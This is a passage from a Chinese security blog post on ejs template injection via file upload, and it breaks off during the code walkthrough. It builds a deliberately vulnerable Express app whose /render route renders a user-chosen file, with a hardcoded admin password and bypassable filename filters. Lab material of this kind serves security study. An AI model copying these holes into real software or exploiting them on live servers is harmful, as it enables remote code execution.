@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>ejs模板引擎玩法学习 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 八月 13日 2024, 8:23 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.9k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      14 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了参考文章，看起来是文件上传+模板可控的玩法，简单来说就是先上传含JavaScript代码的文件，在ejs解析模板时完成代码注入执行。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先创建一个NodeJS项目，安装一下所需依赖：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br><span class="line">npm install express</span><br><span class="line">npm install ejs</span><br><span class="line">npm install express-session</span><br><span class="line">npm install multer</span><br></pre></td></tr></table></figure>
+
+<p>然后在目录下新建uploads和views两个目录，并在views目录下新建两个ejs模板文件login.ejs：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>和upload.ejs：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">accept</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fileInput&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后新建index.js项目主代码文件：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入必要的模块</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); <span class="comment">// Express web framework</span></span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>); <span class="comment">// Embedded JavaScript templates</span></span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>); <span class="comment">// Session middleware for Express</span></span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>); <span class="comment">// Middleware for parsing HTTP request bodies</span></span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>); <span class="comment">// Middleware for handling multipart/form-data</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>); <span class="comment">// File system module</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>); <span class="comment">// Path module</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目录以确保文件路径存在</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createDirectoriesForFilePath</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> dirname = path.<span class="title function_">dirname</span>(filePath);</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(dirname, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户是否登录的中间件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">IfLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 Multer 存储引擎</span></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">    <span class="attr">destination</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)); <span class="comment">// 设置上传文件的目标目录</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">filename</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>); <span class="comment">// 使用原始文件名作为上传后的文件名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置 Multer 上传中间件</span></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123;</span><br><span class="line">    <span class="attr">storage</span>: storage, <span class="comment">// 使用自定义存储选项</span></span><br><span class="line">    <span class="attr">fileFilter</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">        <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>); <span class="comment">// 允许上传其他类型的文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义管理员账户</span></span><br><span class="line"><span class="keyword">const</span> admin = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;ADMIN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 Express 应用</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">// 静态文件服务和中间件配置</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="string">&#x27;Can_U_hack_me?&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由定义</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;you can not be admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_username = username.<span class="title function_">toUpperCase</span>();</span><br><span class="line">    <span class="keyword">if</span> (new_username === admin.<span class="property">username</span> &amp;&amp; password === admin.<span class="property">password</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;ADMIN&quot;</span>;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/rename&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//中间件过滤 &#x27;fileInput&#x27; 是 HTML 表单中 &lt;input type=&quot;file&quot;&gt; 的 name 属性值，Multer 将根据这个值来识别上传的文件。</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;fileInput&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No file uploaded&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;File uploaded successfully: &#x27;</span> + req.<span class="property">file</span>.<span class="property">originalname</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/render&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filename &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Filename parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, filename);</span><br><span class="line">    <span class="keyword">if</span> (filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//漏洞点：将文件内容渲染到页面中</span></span><br><span class="line">    res.<span class="title function_">render</span>(filePath);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="title class_">IfLogin</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//admin检查</span></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> !== <span class="string">&#x27;ADMIN&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access forbidden&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> &#123; oldPath, newPath &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath || !newPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing oldPath or newPath&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newPath &amp;&amp; <span class="regexp">/app\.js|\\|\.ejs/i</span>.<span class="title function_">test</span>(newPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldPath &amp;&amp; <span class="regexp">/\.\.|flag/i</span>.<span class="title function_">test</span>(oldPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_file = newPath.<span class="title function_">toLowerCase</span>();</span><br><span class="line">    <span class="keyword">const</span> oldFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldPath);</span><br><span class="line">    <span class="keyword">const</span> newFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, new_file);</span><br><span class="line">    <span class="keyword">if</span> (newFilePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;oldPath parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(oldFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Old file not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(newFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">409</span>).<span class="title function_">send</span>(<span class="string">&#x27;New file path already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createDirectoriesForFilePath</span>(newFilePath)</span><br><span class="line">    fs.<span class="title function_">rename</span>(oldFilePath, newFilePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error renaming file:&#x27;</span>, err);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error renaming file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;File renamed successfully&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;3000&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`http://localhost:3000`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>测试环境搭建完成，接下来简单捋一下代码逻辑，无关紧要的登录部分直接跳过。</p>
+<h3 id="文件上传与重命名"><a href="#文件上传与重命名" class="headerlink" title="文件上传与重命名"></a>文件上传与重命名</h3><p>首先是文件上传功能：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置 Multer 存储引擎</span></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">    <span class="attr">destination</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)); <span class="comment">// 设置上传文件的目标目录</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">filename</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="title 